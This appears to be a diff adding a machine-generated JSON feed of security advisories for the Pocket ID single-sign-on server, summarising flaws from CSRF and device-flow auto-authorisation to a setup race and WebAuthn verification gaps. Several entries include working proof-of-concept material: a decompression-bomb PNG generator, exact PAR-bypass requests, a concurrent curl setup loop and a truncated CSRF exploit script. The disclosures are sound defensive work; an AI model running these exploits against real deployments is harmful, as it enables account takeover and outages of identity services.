@@ -1,0 +1,1007 @@
+{
+  "schema": "advisorydeck/v1/product-feed",
+  "generated_at": "2026-11-16T09:35:18Z",
+  "product": {
+    "slug": "pocket-id",
+    "name": "Pocket ID",
+    "category": "auth",
+    "homepage": "https://pocket-id.org",
+    "version_scheme": "semver",
+    "branches": []
+  },
+  "advisories": [
+    {
+      "id": "GHSA-4524-6p82-5896",
+      "aliases": [],
+      "title": "/api/oidc/device/verify accepts a query code and ambient browser session without Origin or CSRF proof.",
+      "summary": "Summary: /api/oidc/device/verify accepts a query code and ambient browser session without Origin or CSRF proof.\r\n\r\nDescription:\r\nThe handler reads code from the query string and calls acceptDeviceCode using the authenticated userID. It does not validate Origin, Sec-Fetch-Site, or a CSRF token. The session cookie is SameSite=Lax, which blocks ordinary cross-site POSTs but still sends the cookie to a malicious HTTPS sibling origin in the same schemeful site.\r\n\r\nRelevant locations: backend/internal/oidc/device_handler.go:41-62; backend/internal/oidc/device_service.go:137-157; backend/internal/utils/cookie/add_cookie.go:31-34.\r\n\r\nReproduction:\r\nIsolated Chromium confirmed that a form POST from a sibling same-site origin carries the Lax cookie while a cross-site origin does not. runtime-device-poc.go creates a real device authorization, calls verifyDeviceCode with Origin https://evil.example.com and the victim session context, exchanges the code through the real token handler, and verifies that the access-token subject is the victim user. It uses RequiresReauthentication=false and contacts no production instance.\r\n\r\nImpact:\r\nA same-site attacker who obtains a device code/user code can cause a logged-in victim to authorize the attacker-held grant, then exchange it for a token representing the victim, subject to normal client and group restrictions.\r\n\r\nSuggested remediation:\r\nRequire a session-bound CSRF token and validate the exact allowed Origin before changing device state. JSON is an additional barrier, not a replacement for CSRF protection.",
+      "published_at": "2026-10-28T09:38:48.000Z",
+      "modified_at": "2026-10-28T09:38:48.000Z",
+      "severity": {
+        "level": "low",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-352"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.19.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-4524-6p82-5896",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-4524-6p82-5896",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-4524-6p82-5896",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:7ece2d2ceb6c645cdca99520dcdacafc006920ea920fed223ae5193b082a92d5",
+      "note": null
+    },
+    {
+      "id": "GHSA-53gh-fffg-5f7f",
+      "aliases": [],
+      "title": "Denial of service via image decompression bomb in profile-picture upload",
+      "summary": "## Summary\r\nAny authenticated user can crash the entire Pocket ID server by uploading a small,\r\nspecially-crafted image as their profile picture. The uploaded image is fully decoded into an\r\nin-memory bitmap **before** any dimension, pixel-count, or file-size limit is applied, so a tiny\r\nfile that declares enormous pixel dimensions (a \"decompression bomb\") forces a huge memory\r\nallocation. A handful of such uploads - a few kilobytes each - exhaust the host's memory and the\r\nLinux OOM killer terminates the `pocket-id` process. Because Pocket ID is the OIDC/SSO authority,\r\nits outage denies login to every downstream application that relies on it.\r\n\r\n## Details\r\nThe self-service endpoint `PUT /api/users/me/profile-picture`\r\n([`user_controller.go#L46`](https://github.com/pocket-id/pocket-id/blob/fa8aa447061fd096184ac9e7c3511c62087b3f8c/backend/internal/controller/user_controller.go#L46),\r\ngated by `authMiddleware.WithAdminNotRequired()` → any authenticated non-admin user) passes the\r\nuploaded file to `UserService.UpdateProfilePicture` → `profilepicture.CreateProfilePicture`.\r\nThat function decodes the image first and only then resizes it:\r\n\r\n```go\r\n// backend/internal/utils/image/profile_picture.go\r\nfunc CreateProfilePicture(file io.ReadSeeker) (io.ReadSeeker, error) {\r\n    img, _, err := imageorient.Decode(file)          // (1) decodes fully: allocates ~width*height*channels\r\n    ...\r\n    img = imaging.Fill(img, 300, 300, ...)           // (2) resize happens only AFTER the full decode\r\n```\r\n\r\nTwo compounding problems:\r\n\r\n1. **No dimension / pixel-count guard before decode.** `imageorient.Decode` (and the WebP\r\n   fallback) allocate memory proportional to the image's *declared* `width × height`, which is\r\n   independent of the compressed file size. There is no `image.DecodeConfig` pre-check to reject\r\n   oversized images. A ~140 KB grayscale PNG that declares 12000×12000 decodes to ~144 MP; a\r\n   ~762 KB PNG declaring 28000×28000 decodes to ~784 MP.\r\n\r\n2. **No size-limit middleware on the route.** Unlike the OIDC client-logo upload - which is\r\n   wrapped with `fileSizeLimitMiddleware.Add(2<<20)` - the profile-picture routes have no size\r\n   limit at all\r\n   ([`user_controller.go#L45-L46`](https://github.com/pocket-id/pocket-id/blob/fa8aa447061fd096184ac9e7c3511c62087b3f8c/backend/internal/controller/user_controller.go#L45-L46)).\r\n\r\nThe decoded memory is also not promptly returned to the OS, so repeated uploads accumulate.\r\nThe same decode path is reachable (admin-gated) through the client-logo upload and through\r\n`OidcService.downloadAndSaveLogoFromURL` (`StripMetadata`), which decode images through the same\r\nlibraries and lack the same dimension guard.\r\n\r\n**Preconditions:** a valid account and session (any non-admin user; `PR:L`). No user\r\ninteraction, default configuration. On a memory-limited deployment (a container with a\r\n256 MB-1 GB limit, common for self-hosting) a **single** small upload is sufficient.\r\n\r\n## Proof of Concept\r\nOn an isolated local instance (all traffic on 127.0.0.1):\r\n\r\n1. Build & run the backend at the tested commit and complete initial admin setup; create a\r\n   normal non-admin user and obtain its session cookie (via the admin one-time-access-token\r\n   exchange).\r\n2. Craft a decompression-bomb PNG - a small file that declares huge dimensions (grayscale,\r\n   all-zero scanlines). Minimal generator (`poc/pngbomb.py`):\r\n   ```python\r\n   import sys, struct, zlib\r\n   W = H = int(sys.argv[1]); out = sys.argv[2]\r\n   def chunk(t, d): return struct.pack(\">I\", len(d)) + t + d + struct.pack(\">I\", zlib.crc32(t+d) & 0xffffffff)\r\n   co = zlib.compressobj(9); idat = bytearray(); row = b\"\\x00\" + b\"\\x00\"*W\r\n   for _ in range(H): idat += co.compress(row)\r\n   idat += co.flush()\r\n   open(out, \"wb\").write(b\"\\x89PNG\\r\\n\\x1a\\n\" + chunk(b\"IHDR\", struct.pack(\">IIBBBBB\", W, H, 8, 0, 0, 0, 0)) + chunk(b\"IDAT\", bytes(idat)) + chunk(b\"IEND\", b\"\"))\r\n   ```\r\n   `python3 poc/pngbomb.py 12000 bomb.png`  →  a **140 KB** file that decode...",
+      "published_at": "2026-10-09T18:05:19.000Z",
+      "modified_at": "2026-10-09T18:05:19.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-400",
+        "CWE-409"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.15.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-53gh-fffg-5f7f",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-53gh-fffg-5f7f",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-53gh-fffg-5f7f",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:cf8390f47a62cf71f1fff72cc66baa968fbad35e646429d86b2f30aa9c05436a",
+      "note": null
+    },
+    {
+      "id": "GHSA-v5wr-7gfv-cv92",
+      "aliases": [],
+      "title": "Missing Authorization and User Interface (UI) Misrepresentation of Critical Information in pocket-id/pocket-id",
+      "summary": "# Summary\r\n\r\nThe page that finishes a device sign-in accepts the device's code in the address itself. When a signed-in user opens such a link, the authorization completes during the page load: the code is never presented for confirmation, the user is never asked whether it matches what the device is showing, and there is no approve or deny step. Whoever composed the link then collects the tokens by polling, as the protocol intends the real device to.\r\n\r\nThis happens in two situations, and between them they cover the ordinary case:\r\n\r\n- the sign-in is for an application the user has approved before, even once, at any time in the past;\r\n- the sign-in is for an application configured to skip the consent screen, **including one the user has never encountered**.\r\n\r\nWe verified both against the published release image, driving a real headless browser with a real signed-in session. The page really does render, and it really does complete the flow with nothing clicked.\r\n\r\nPutting the code in the link is a legitimate optimisation, and RFC 8628 defines it. What the specification also says, in the same section, is that the optimisation removes only the typing: \"the user interaction described in Section 3.3 is still followed, with the optimization that the user does not need to type in the 'user_code'. The server SHOULD display the 'user_code' to the user and ask them to verify that it matches the 'user_code' being displayed on the device to confirm they are authorizing the correct device. As before, in addition to taking steps to confirm the identity of the device, the user should also be afforded the choice to approve or deny the authorization request.\" Its security considerations, on this exact optimisation, add: \"it is particularly important to confirm that the device is in the user's possession, as the user no longer has to type in the code being displayed on the device manually.\" Both of those steps -- the code-matching check and the approve/deny choice -- are the defence against someone else's device being authorized by a user who was simply sent a link. On the paths described here, neither runs.\r\n\r\n# Affected Component and Versions\r\n\r\nAffected component:\r\n\r\n- Docker image: `ghcr.io/pocket-id/pocket-id`\r\n- OIDC device-authorization endpoint and the device verification page\r\n- Related source files: `frontend/src/routes/device/+page.svelte`, `frontend/src/routes/device/+page.ts`, `backend/internal/oidc/device_service.go`, `backend/internal/oidc/authorization_service.go`, `backend/internal/oidc/module.go`\r\n\r\nThe behavior was reviewed at:\r\n\r\n- release tag `v2.13.0` (repository commit `f39f59e9e0dcf0957c83872e60093cebb90ca596`)\r\n- published image `ghcr.io/pocket-id/pocket-id:v2.13.0`\r\n\r\nDirect static review on 2026-08-17 confirmed that the same relevant behavior remains on the current default branch at commit `22354581` (approximately 25 commits after `v2.13.0`); where line references differ from `v2.13.0` the behaviour is unchanged, and the run is the authority.\r\n\r\nWe re-ran the reproduction end to end on 2026-08-18 against the published image `ghcr.io/pocket-id/pocket-id:v2.13.0`, driven by the file at `review/shared/repro-plans-20260818/pocket-id-pocket-id-poc.mjs`. Every oracle passed and the run reported `RESULT: REPRODUCED` with exit status 0. The transcript is preserved at `review/pocket-id-pocket-id/pocket-id-e2e-transcript-20260818.txt`. So this is not stale against something already fixed on `main`.\r\n\r\n`v2.13.0` is the current release at the time of writing, and the current default branch carries the same behaviour. No patched version was identified.\r\n\r\n# Security Boundary and Preconditions\r\n\r\nThe practical scenario requires:\r\n\r\n1. the ability to make one device-authorization request against the deployment -- authenticating as a client at `POST /api/oidc/device/authorize`; for a public client that is the client identifier alone, an operator-chosen and often human-readable string that any signed-in user of the deployment can...",
+      "published_at": "2026-09-19T18:51:09.000Z",
+      "modified_at": "2026-09-19T18:51:09.000Z",
+      "severity": {
+        "level": "low",
+        "score": 2.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-451",
+        "CWE-862"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.15.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-v5wr-7gfv-cv92",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-v5wr-7gfv-cv92",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-v5wr-7gfv-cv92",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:568c660f2a2358c6f1b54e72d18e263214732fe3e74eefdd775513573e41b0c0",
+      "note": null
+    },
+    {
+      "id": "GHSA-fg8g-5j43-phc5",
+      "aliases": [],
+      "title": "PAR requirement bypass: front-channel authorize accepted for PAR-pinned clients due to query-only `request_uri` check",
+      "summary": "`backend/internal/oidc/authorization_handler.go:61` decides \"this is a PAR request\" from\r\n`c.Query(\"request_uri\")` - the query string only. Fosite resolves it from `r.Form`\r\n(the merged query+body map, where the POST body wins on duplicate keys:\r\nfork `authorize_request_handler.go:388`, `pushed_authorize_request_handler.go:59`).\r\nOne request can therefore carry two values: a PAR-prefixed `request_uri` in the query\r\n(guard satisfied → PAR assumed) and an empty `request_uri` in the body (fosite sees\r\nno PAR session → plain front-channel flow). No PAR session is created, looked up, or\r\nconsumed. Reproduced on public+PKCE and confidential PAR clients; `GET /authorize`\r\nhas no body so the shadow is not constructible there.\r\n\r\n## Attack scenario\r\nAttacker operates a registered OIDC client with PAR required. Victim with an active\r\nIdP session visits one crafted auto-POST (single visit, zero clicks - prompt=none +\r\nskipConsent). A code is issued to the attacker's redirect_uri and redeemed for\r\naccess + ID + refresh tokens as the victim.\r\n\r\n## Steps to reproduce (from zero, ~2 min)\r\nPrereq: clean `ghcr.io/pocket-id/pocket-id:v2.14.0` with `APP_URL=http://127.0.0.1:1412`\r\n(fresh volume - setup must be uncompleted). A copy-paste script is attached\r\n(`repro-f002-par-bypass.sh`; run `./repro-f002-par-bypass.sh http://127.0.0.1:1412`).\r\n\r\n1. Create the initial admin (returns admin session cookie):\r\n   `POST /api/signup/setup`\r\n   `{\"username\":\"admin\",\"email\":\"admin@lab.local\",\"firstName\":\"Lab\",\"lastName\":\"Admin\"}`\r\n2. Create a victim (admin session):\r\n   `POST /api/users` `{\"username\":\"victim\",\"email\":\"victim@lab.local\",\"firstName\":\"Vic\",\"lastName\":\"Tim\"}`\r\n   → note `id`.\r\n3. Mint + exchange a one-time-access token for the victim (admin session, then anonymous):\r\n   `POST /api/users/<victim-id>/one-time-access-token` `{\"ttl\":\"15m\"}` → `{\"token\":\"…\"}`;\r\n   `POST /api/one-time-access-token/<token>` → victim session cookie.\r\n4. Register the attacker client (admin session):\r\n   `POST /api/oidc/clients`\r\n   `{\"name\":\"repro-par\",\"callbackURLs\":[\"https://app.lab.local/cb\"],\"isPublic\":true,\"pkceEnabled\":true,\"requiresPushedAuthorizationRequests\":true,\"skipConsent\":true}`\r\n   → note client `id`.\r\n5a. CONTROL - victim session:\r\n   `POST /authorize` with form body\r\n   `client_id=<id>&response_type=code&redirect_uri=https%3A%2F%2Fapp.lab.local%2Fcb&scope=openid+profile&state=st0123456789abcdef&prompt=none&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256`\r\n   → `303` to `…/cb?error=error&error_description=The+error+is+unrecognizable` (PAR guard fires).\r\n5b. EXPLOIT - identical request, but URL is\r\n   `/authorize?request_uri=urn:ietf:params:oauth:request_uri:shadow`\r\n   and the body is prefixed with `request_uri=&`\r\n   → `303` to `https://app.lab.local/cb?code=pocket_id_ac_…&scope=openid+profile&state=…`\r\n   **authorization code issued, no PAR session ever existed, zero interaction.**\r\n6. Redeem (no secret - public client, RFC 7743 PKCE pair):\r\n   `POST /api/oidc/token`\r\n   `grant_type=authorization_code&code=<code>&redirect_uri=https%3A%2F%2Fapp.lab.local%2Fcb&client_id=<id>&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk`\r\n   → access + ID + refresh tokens; ID token carries the VICTIM:\r\n   `sub=<victim-id>`, `preferred_username=victim`, `amr=[\"otp\"]`.\r\n\r\nExpected on a fixed build: step 5b behaves like 5a (error, no code).\r\n\r\n## Fix suggestion\r\nRead the same surface fosite reads, e.g. after `ParseForm` use\r\n`c.Request.Form.Get(\"request_uri\")`, or reject requests carrying `request_uri`\r\nin both query and body.",
+      "published_at": "2026-09-19T18:50:46.000Z",
+      "modified_at": "2026-09-19T18:50:46.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "2.10.0",
+              "fixed": "2.15.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-fg8g-5j43-phc5",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-fg8g-5j43-phc5",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-fg8g-5j43-phc5",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:6276d6b6118a6104f8efad56bbf98ee6e7364392114068ef8291f1d0779020e8",
+      "note": null
+    },
+    {
+      "id": "GHSA-252c-qmvj-75c9",
+      "aliases": [],
+      "title": "CSRF can create an attacker-controlled administrator account",
+      "summary": "### Summary\r\n\r\npocket-id issues its authentication and other sensitive cookies without an explicit `SameSite` attribute. The tested release also has no CSRF token or request-origin/Fetch Metadata validation in the relevant route chain. For JSON endpoints, Pocket ID explicitly selects Gin's JSON binder; that binder decodes the request body without enforcing the HTTP `Content-Type`. A cross-site HTML form with `enctype=\"text/plain\"` can therefore submit a JSON-shaped body without a CORS preflight.\r\n\r\nIf the victim is an administrator and their browser includes the session cookie on that cross-site POST, the attacker can cause `POST /api/users` to create a new user with `isAdmin: true`. This creates a persistent unauthorized administrator account.\r\n\r\nThe final login step is conditional. To authenticate the newly created account through the demonstrated path, `emailOneTimeAccessAsUnauthenticatedEnabled` must be enabled. It is `false` by default and is publicly readable through `GET /api/application-configuration`. When it is disabled, the CSRF account-creation issue remains, but this particular email-login takeover chain is incomplete.\r\n\r\n### Root cause\r\n\r\n1. **Cookies omit `SameSite`.** `backend/internal/utils/cookie/add_cookie.go` calls `c.SetCookie` for access-token, session, device-token, device-login, and reauthentication cookies without setting an explicit SameSite policy.\r\n2. **No CSRF protection on the relevant API routes.** The global middleware chain contains no CSRF token check and no `Origin` or `Sec-Fetch-Site` validation for cookie-authenticated state-changing requests.\r\n3. **JSON binding does not enforce `Content-Type`.** `dto.ShouldBindWithNormalizedJSON` calls `ctx.ShouldBindWith(obj, binding.JSON)`, and Gin's JSON binder decodes the body without checking its media type. The `POST /api/users` handler uses this helper.\r\n4. **The admin bit is client-controlled.** `POST /api/users` accepts `dto.UserCreateDto.IsAdmin`, and `UserService.CreateUser` copies that value into the new user record. The endpoint itself requires an administrator session, which is supplied by the victim's cookie.\r\n\r\n### Preconditions and limitations\r\n\r\n- The pocket-id instance is reachable by the victim's browser and the victim has an active administrator session.\r\n- The target browser sends the cookie with the cross-site form POST. Modern Chromium-based browsers normally treat an omitted SameSite attribute as Lax, but retain a short-lived compatibility exception for recently set cookies on top-level POST navigations. Older or differently configured browsers may have broader behavior. Exploitability is therefore browser-dependent and should be tested against the target browser.\r\n- The unauthenticated email one-time-access feature must be enabled for the demonstrated account-takeover chain. The CSRF user creation itself does not depend on that flag.\r\n- The PoC sets `emailVerified: true` in the forged request, but the tested user-creation path accepts that client-supplied field; it does not prove that the email address was independently verified.\r\n\r\n### Proof of concept\r\n\r\nUse a disposable, fresh instance. The compose file bind-mounts `./data`, so an existing database is not fresh.\r\n\r\nMake sure ./data doesn't have any data in it.\r\n\r\nPoC Dependencies: sqlite3, node.js.\r\n\r\ndocker-compose.yml\r\n```yaml\r\nservices:\r\n  pocket-id:\r\n    image: ghcr.io/pocket-id/pocket-id:v2.12.0\r\n    ports:\r\n      - \"1411:1411\"\r\n    environment:\r\n      APP_URL: http://localhost:1411\r\n      ENCRYPTION_KEY: poc-encryption-key-not-secret\r\n      TRUST_PROXY: \"false\"\r\n    volumes:\r\n      - \"./data:/app/data\"\r\n```\r\n\r\npoc.mjs\r\n```javascript\r\n// PoC: pocket-id <= v2.12.0 - CSRF -> attacker-controlled admin -> account takeover\r\n// Usage: docker compose up -d && npm i playwright && npx playwright install chromium && node poc.mjs\r\nimport { chromium } from 'playwright';\r\nimport http from 'node:http';\r\nimport { execSync } from 'node:child_process';\r\n\r\nconst BASE = 'http://localhost:...",
+      "published_at": "2026-08-07T09:22:13.000Z",
+      "modified_at": "2026-08-07T09:22:13.000Z",
+      "severity": {
+        "level": "high",
+        "score": 7.7,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-352",
+        "CWE-1275"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.13.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-252c-qmvj-75c9",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-252c-qmvj-75c9",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-252c-qmvj-75c9",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:7c2256e3fb3bbdf04d43654fa86221d11e67adc5fa2871b767cdb735850be454",
+      "note": null
+    },
+    {
+      "id": "GHSA-x6w5-6mr5-mxrx",
+      "aliases": [],
+      "title": "Concurrent initial setup requests create multiple unauthenticated administrators",
+      "summary": "# Concurrent initial setup requests create multiple unauthenticated administrators\r\n\r\n## Summary\r\n\r\n`POST /api/signup/setup` is vulnerable to a time-of-check to time-of-use race on PostgreSQL. `SignUpInitialAdmin` starts a transaction, counts existing users, and creates an administrator when the count is zero. The transaction does not serialize this decision and there is no unique one-time setup marker.\r\n\r\nSeveral concurrent unauthenticated requests can therefore all observe an empty user table and each create a different administrator. Every successful request also receives a valid Pocket ID browser session for its new administrator.\r\n\r\nI reproduced this twice against the official `ghcr.io/pocket-id/pocket-id:v2` image, version `2.11.0`, with the official PostgreSQL configuration. The same vulnerable logic is still present on `main` at commit `6e859de2dd55dfc59d9cde3fab5d7a9789c6aca9`.\r\n\r\nThis report is submitted in response to the Pocket ID $1,000 critical vulnerability challenge.\r\n\r\n## Root cause\r\n\r\n`backend/internal/usersignup/service.go` performs a separate read and write in a normal transaction:\r\n\r\n```go\r\ntx := s.db.Begin()\r\n\r\nsetupCompleted, err := s.isInitialAdminSetupCompleted(ctx, tx)\r\nif setupCompleted {\r\n    return model.User{}, \"\", &common.SetupNotAvailableError{}\r\n}\r\n\r\nuser, err := s.userCreator.CreateUserInternal(ctx, config, userToCreate, false, tx)\r\n\r\nerr = tx.Commit().Error\r\n```\r\n\r\n`isInitialAdminSetupCompleted` only counts users:\r\n\r\n```go\r\nerr := db.WithContext(ctx).Model(&model.User{}).\r\n    Where(\"id != ?\", common.StaticApiKeyUserID).\r\n    Count(&userCount).Error\r\n\r\nreturn userCount != 0, nil\r\n```\r\n\r\nUnder PostgreSQL's default `READ COMMITTED` isolation, concurrent transactions can all complete the count before any of the new users commits. The users have different unique usernames and email addresses, so no database constraint makes the later inserts conflict.\r\n\r\n## Reproduction\r\n\r\n### Environment\r\n\r\n- Pocket ID image: `ghcr.io/pocket-id/pocket-id:v2`\r\n- Pocket ID version: `2.11.0`\r\n- PostgreSQL image: `postgres:17-alpine`\r\n- Fresh Pocket ID database\r\n- The Pocket ID port was bound only to localhost\r\n\r\n### Requests\r\n\r\nThe following sends 20 different setup requests at the same time:\r\n\r\n```bash\r\nfor n in $(seq -w 1 20); do\r\n  curl -sS \\\r\n    -o \"/tmp/setup-$n.body\" \\\r\n    -w \"%{http_code}\" \\\r\n    -H \"Content-Type: application/json\" \\\r\n    -d \"{\\\"username\\\":\\\"raceadmin$n\\\",\\\"email\\\":\\\"race$n@example.invalid\\\",\\\"firstName\\\":\\\"Race\\\",\\\"lastName\\\":\\\"$n\\\"}\" \\\r\n    http://127.0.0.1:21411/api/signup/setup \\\r\n    > \"/tmp/setup-$n.code\" &\r\ndone\r\nwait\r\n```\r\n\r\n### Result\r\n\r\nIn the first run, requests `01`, `02`, `11`, and `18` all returned HTTP 200 with different user IDs and `\"isAdmin\": true`.\r\n\r\nThe authoritative database query confirmed four administrators:\r\n\r\n```sql\r\nSELECT username, is_admin, created_at\r\nFROM users\r\nORDER BY created_at;\r\n```\r\n\r\n```text\r\nraceadmin18 | true | 2026-07-23 22:12:05.996637+00\r\nraceadmin02 | true | 2026-07-23 22:12:05.996826+00\r\nraceadmin11 | true | 2026-07-23 22:12:05.996973+00\r\nraceadmin01 | true | 2026-07-23 22:12:05.998432+00\r\n```\r\n\r\nI then reset the user state and repeated the test with 20 new identities. Requests `01`, `02`, `03`, and `18` again returned HTTP 200, and PostgreSQL again contained four distinct administrators.\r\n\r\nSequential requests behave correctly. Once one setup transaction commits, later requests are rejected. The issue is specifically the concurrent check and insert.\r\n\r\n## Impact\r\n\r\nAn unauthenticated attacker who races the legitimate owner during first-time setup can obtain a persistent administrator account and a valid administrator session.\r\n\r\nAn administrator can manage users, passkeys, OIDC clients and secrets, API permissions, signup and one-time access tokens, application configuration, SCIM providers, and user groups. In a real deployment, the attacker can retain control of the identity provider, issue further credentials, and compromise downstream s...",
+      "published_at": "2026-07-29T23:04:21.000Z",
+      "modified_at": "2026-07-29T23:04:22.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.12.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-x6w5-6mr5-mxrx",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-x6w5-6mr5-mxrx",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-x6w5-6mr5-mxrx",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:c8f0c116ec8e2416db519b8511454845ffa9f352995f217e94d40b6c2a2e2c92",
+      "note": null
+    },
+    {
+      "id": "GHSA-pgqv-hh75-xx4x",
+      "aliases": [],
+      "title": "WebAuthn user verification policy is not enforced during ceremony validation",
+      "summary": "### Summary\r\n\r\nPocket ID reconstructs WebAuthn ceremony state without restoring the persisted UserVerification policy. Because go-webauthn only enforces the authenticator user-verification (UV) flag when SessionData.UserVerification is set to VerificationRequired, the zero value silently skips the required verification check.\r\nA stolen or otherwise usable authenticator may therefore complete login, registration, or reauthentication without the PIN or biometric verification that Pocket ID configured as mandatory.\r\n\r\nThe issue was fixed in commit 0983e911693396d8c807331ed867be5369f501f2⁠.\r\n\r\n\r\n### Details\r\n\r\nWhen a WebAuthn ceremony begins, Pocket ID creates and persists ceremony state containing the required user-verification policy. When the session is later retrieved from the database, several code paths reconstruct a gowebauthn.SessionData value but omit UserVerification.\r\n\r\nThe first affected discoverable-login flow reconstructs the session as follows in backend/internal/webauthn/service.go:\r\n\r\nsession := gowebauthn.SessionData{\r\n    Challenge: storedSession.Challenge,\r\n    Expires:   storedSession.ExpiresAt.ToTime(),\r\n}\r\n\r\nThis reconstructed session is then passed to ValidateDiscoverableLogin. Without SessionData.UserVerification, the authenticator UV flag is not enforced, even though the required policy was established when the ceremony began.\r\n\r\nThe registration or attestation flow contains the same omission:\r\nsession := gowebauthn.SessionData{\r\n    Challenge:  storedSession.Challenge,\r\n    Expires:    storedSession.ExpiresAt.ToTime(),\r\n    CredParams: storedSession.CredentialParams,\r\n    UserID:     []byte(userID),\r\n}\r\n\r\nA third discoverable-login or reauthentication flow also reconstructs SessionData using only Challenge and Expires.\r\n\r\nThe original scan identified the three occurrences near lines 141, 248, and 450 of backend/internal/webauthn/service.go. Although reported as three findings, they are instances of the same underlying vulnerability: the required WebAuthn user-verification policy is dropped during SessionData reconstruction.\r\n\r\nRestoring UserVerification from storedSession preserves the policy through the ceremony-validation call and ensures that the user-verification enforcement branch in go-webauthn is taken.\r\n\r\nThe issue was fixed in commit 0983e911693396d8c807331ed867be5369f501f2⁠\r\n\r\n### Impact\r\n\r\nThis is an improper-authentication vulnerability classified as CWE-287 and OWASP A07:2021 - Identification and Authentication Failures.\r\nUsers and administrators relying on Pocket ID’s mandatory WebAuthn user verification are affected. In vulnerable flows, possession of an otherwise usable authenticator may be sufficient to complete authentication or registration without the required PIN or biometric verification.\r\nThis weakens the intended distinction between simple authenticator possession and verified user presence. It affects registration, discoverable login, and reauthentication code paths that reconstruct SessionData without restoring UserVerification.\r\n\r\nThe vulnerability was identified by Swifi AI Code Scanner (Source: https://swifi.ai).",
+      "published_at": "2026-07-29T23:03:26.000Z",
+      "modified_at": "2026-07-29T23:03:26.000Z",
+      "severity": {
+        "level": "low",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-287"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.12.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-pgqv-hh75-xx4x",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-pgqv-hh75-xx4x",
